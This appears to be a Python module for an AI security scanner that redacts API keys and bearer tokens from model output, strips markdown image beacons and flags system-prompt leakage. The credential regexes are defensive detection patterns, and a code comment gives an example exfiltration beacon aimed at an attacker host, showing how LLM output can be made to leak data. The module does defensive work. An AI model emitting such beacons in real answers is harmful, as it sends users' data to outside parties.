"""Output and Egress Security Scanner for SENTINEL.

Prevents leakage of API keys, credentials, internal system prompts,
and markdown data exfiltration beacons in generated answers.
Owned by: Adhya (AI Security Engineer)
"""

import re
from typing import List, Optional, Tuple
from pydantic import BaseModel, Field


class EgressVerdict(BaseModel):
    """Result of egress security inspection on generated model output."""
    is_safe: bool = Field(..., description="True if output is safe to transmit to user.")
    has_leakage: bool = Field(default=False, description="True if secret or prompt leak detected.")
    sanitized_text: str = Field(..., description="Sanitized/redacted output text.")
    violations: List[str] = Field(default_factory=list, description="Specific egress violations found.")


class EgressScanner:
    """Monitors generated LLM output before presentation to user."""

    # Secret and credential regexes
    CREDENTIAL_PATTERNS = [
        (re.compile(r"\b(?:sk-[a-zA-Z0-9]{32,}|sk-proj-[a-zA-Z0-9_-]{40,})\b"), "openai_api_key"),
        (re.compile(r"\b(?:ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82})\b"), "github_token"),
        (re.compile(r"\b(?:AKIA[0-9A-Z]{16})\b"), "aws_access_key"),
        (re.compile(r"\b(?:AIza[0-9A-Za-z_-]{35})\b"), "google_api_key"),
        (re.compile(r"\bBearer\s+[a-zA-Z0-9_\-\.]{20,}\b"), "bearer_auth_token"),
    ]

    # Markdown data exfiltration beacon: ![](http://evil.com?leak=...)
    EXFILTRATION_BEACON_PATTERN = re.compile(
        r"!\[.*?\]\(https?://[^\s\)]+(?:\?[^\s\)]+)?\)", re.I
    )

    def __init__(self, system_prompt_leak_threshold: float = 0.65):
        self.leak_threshold = system_prompt_leak_threshold

    @classmethod
    def redact_secrets(cls, text: str) -> Tuple[str, List[str]]:
        """Redact discovered secret credentials with safe placeholder tokens."""
        redacted = text
        violations = []

        for pattern, label in cls.CREDENTIAL_PATTERNS:
            matches = pattern.findall(redacted)
            if matches:
                violations.append(f"credential_leak:{label}")
                redacted = pattern.sub(f"[REDACTED_{label.upper()}]", redacted)

        # Check and strip markdown exfiltration beacons
        beacon_matches = cls.EXFILTRATION_BEACON_PATTERN.findall(redacted)
        if beacon_matches:
            violations.append("markdown_exfiltration_beacon")
            redacted = cls.EXFILTRATION_BEACON_PATTERN.sub("[REDACTED_IMAGE_BEACON]", redacted)

        return redacted, violations

    def check_system_prompt_leak(
        self,
        output_text: str,
        system_prompt: Optional[str]
    ) -> Tuple[bool, float]:
        """Check if output verbatim regurgitates the confidential system prompt."""
        if not system_prompt or not output_text:
            return False, 0.0

        # Clean strings
        sys_clean = " ".join(system_prompt.lower().split())
        out_clean = " ".join(output_text.lower().split())

        # Substring containment check
        if len(sys_clean) > 50 and sys_clean in out_clean:
            return True, 1.0

        # Word-level Jaccard similarity between system prompt and output
        sys_words = set(sys_clean.split())
        out_words = set(out_clean.split())
        if not sys_words or not out_words:
            return False, 0.0

        intersection = len(sys_words.intersection(out_words))
        overlap_ratio = intersection / len(sys_words)

        is_leak = overlap_ratio >= self.leak_threshold
        return is_leak, overlap_ratio

    def scan(
        self,
        output_text: str,
        system_prompt: Optional[str] = None
    ) -> EgressVerdict:
        """Scan LLM generated output before delivering to user."""
        if not output_text:
            return EgressVerdict(
                is_safe=True,
                has_leakage=False,
                sanitized_text="",
                violations=[]
            )

        sanitized, violations = self.redact_secrets(output_text)

        # Check for system prompt leak
        if system_prompt:
            is_leak, ratio = self.check_system_prompt_leak(sanitized, system_prompt)
            if is_leak:
                violations.append(f"system_prompt_leakage(overlap={ratio:.2f})")
                sanitized = (
                    "I cannot provide this output as it contains confidential system instructions."
                )

        is_safe = len(violations) == 0

        return EgressVerdict(
            is_safe=is_safe,
            has_leakage=not is_safe,
            sanitized_text=sanitized,
            violations=violations
        )

